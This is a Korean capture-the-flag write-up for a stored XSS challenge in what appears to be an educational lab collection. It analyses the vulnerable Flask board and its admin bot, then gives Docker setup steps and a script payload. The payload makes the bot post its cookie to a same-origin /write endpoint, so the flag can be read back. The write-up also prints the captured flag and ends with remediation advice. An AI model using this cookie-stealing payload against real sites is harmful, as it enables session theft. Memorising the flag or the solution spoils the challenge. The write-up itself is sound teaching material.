# [client] XSS #1 — 기본 (Stored XSS) 라이트업

- 대상: `arang-edu-challs-collection` / `challenges/client/xss-1`
- 카테고리: client
- 버그클래스: Cross-Site Scripting (Stored)
- 포트: 9101 (스코어보드: 9000)

## 취약점 분석

`challenges/client/xss-1/app.py`는 공용 게시판 골격(`_base/flask_board/core.py`)의 `create_app()`에 아래 옵션을 전달한다.

```python
app = create_app(
    title="XSS #1 — 기본",
    chal_id="xss-1",
    flag=os.environ.get("FLAG_XSS_1", "flag{local_test_flag}"),
    admin_password=os.environ.get("ADMIN_PASSWORD", "admin1234"),
    needs_bot=True,
    flag_in_cookie=True,
    content_filter=None,   # 필터 없음
    render_safe=True,      # ← XSS sink
)
```

- `render_safe=True` → 게시글 본문(`view.html`)이 템플릿에서 `|safe`로 렌더링되어 이스케이프 없이 그대로 출력됨
- `content_filter=None` → 본문에 대한 입력 필터가 전혀 없음 → `<script>` 태그가 그대로 저장/실행됨
- `flag_in_cookie=True` → admin으로 로그인하면 `resp.set_cookie("flag", flag)`로 flag가 쿠키에 세팅됨. `HttpOnly` 속성이 없어 `document.cookie`로 JS에서 읽을 수 있음

`bot/bot.py`는 `/report`로 제출된 URL을, admin으로 로그인한 headless Chromium으로 방문한다(`/login` → `admin` / `ADMIN_PASSWORD`). 즉 신고 기능으로 admin 세션의 브라우저 컨텍스트에서 내 XSS 페이로드를 실행시킬 수 있다.

### 핵심 익스플로잇 경로 (외부 리스너 불필요)

`_base/flask_board/core.py`의 `/write`, `/report` 로직을 보면, 이 프로젝트는 **외부 egress 리스너 없이도** 풀리도록 설계되어 있다.

```python
last_reporter = {"uid": None}
...
@app.route("/report", methods=["GET", "POST"])
def report():
    ...
    last_reporter["uid"] = session.get("userid")   # 봇이 쓴 글의 귀속 대상
    requests.post(bot_url, data={"chal": chal_id, "url": url}, timeout=5)
    ...

@app.route("/write", methods=["GET", "POST"])
def write():
    ...
    item = {"seq": len(articles), "subject": subject,
            "author": session["userid"], "content": content}
    if session["userid"] == "admin" and last_reporter["uid"]:
        item["for_user"] = last_reporter["uid"]   # 신고자 본인에게만 노출
    articles.append(item)
```

즉, 내가 심어둔 스크립트가 admin 브라우저(봇)에서 실행되면서 **같은 오리진**으로 `/write`에 `fetch` POST를 보내면, admin 명의의 새 글이 작성되고, 이 글은 **직전 신고자(나)** 에게만 보이도록 서버가 처리해준다. 이 글의 본문에 `document.cookie`(flag 쿠키 포함)를 담으면 내 계정으로 그대로 읽을 수 있다.

## 환경 실행 (Ubuntu)

```bash
# Docker 설치 (없는 경우)
sudo apt update
sudo apt install -y docker.io docker-compose-plugin git
sudo systemctl enable --now docker
sudo usermod -aG docker $USER && newgrp docker

# 저장소 클론 및 실행
git clone https://github.com/JaewookYou/arang-edu-challs-collection.git
cd arang-edu-challs-collection
./gen_flags.sh
docker compose up -d xss-1 bot platform
```

접속: `http://localhost:9101` (문제), `http://localhost:9000` (스코어보드)

> `docker-compose.yml`의 `bot` 서비스에는 이미 `host.docker.internal:host-gateway` extra_hosts가 기본 설정되어 있다(외부 리스너 방식을 쓸 경우를 대비). 본 라이트업의 최종 풀이는 이 설정 없이도 동작한다.

## 공격 페이로드

### 1) 회원가입 및 로그인

`http://localhost:9101` 접속 → 회원가입(예: `a123456` / `a123456`) → 로그인.

### 2) 게시글 작성 (글쓰기)

본문에 아래 페이로드를 그대로 입력해 저장한다.

```html
<script>
fetch('/write', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'subject=leak&content=' + encodeURIComponent(document.cookie)
});
</script>
```

저장 후 게시글 URL에서 글 번호를 확인한다 (예: `http://localhost:9101/board/803` → 번호 `803`).

### 3) 신고(report)로 admin 봇 유인

`/report` 메뉴에서 **내부 서비스명**을 host로 사용한 URL을 제출한다 (호스트 접속용 `localhost`가 아님에 주의).

```
http://xss-1:9101/board/803
```

### 4) 결과 확인

10~15초 대기(봇이 headless Chromium을 띄우고 admin으로 로그인 후 방문하는 시간) 후, 내 `/board`로 돌아가면 admin이 작성한 새 글(`leak`)이 보인다. 해당 글을 열람하면 본문에 `document.cookie` 전체가 텍스트로 노출되며, 그 안에 `flag=FLAG{...}` 형태로 flag가 포함되어 있다.

## 플래그

```
flag{75a9fc2a2b391fba4d28}
```

## 대응방안

- 출력 시 컨텍스트에 맞는 escape(HTML 엔티티 인코딩) 적용, `|safe` 사용 금지
- 프레임워크의 기본 자동 escape 기능 유지
- 민감한 쿠키(`flag`, 세션 등)에는 `HttpOnly` 속성 부여
- Content-Security-Policy(CSP) 헤더 적용으로 인라인 스크립트 실행 차단
- 서버 측에서도 상태 변경 요청(`/write` 등)에 CSRF 토큰을 요구해, admin 세션이 임의 오리진 스크립트에 의해 대신 글을 쓰는 2차 피해를 막을 것
